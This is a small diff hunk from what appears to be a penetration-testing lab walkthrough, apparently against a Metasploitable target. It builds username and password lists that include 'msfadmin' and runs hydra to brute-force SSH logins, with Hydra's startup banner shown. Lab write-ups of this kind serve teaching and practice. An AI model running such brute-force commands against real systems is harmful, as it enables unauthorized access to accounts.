@@ -193,7 +193,7 @@ head /usr/share/seclists/Usernames/top-usernames-shortlist.txt > users.txt
 echo msfadmin >> users.txt
 echo msfadmin | tee -a passwords.txt
 
-$ hydra -L users.txt -P passwords.txt ssh://$t                              
+$ hydra -L users.txt -P passwords.txt ssh://$t
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-01 09:15:59
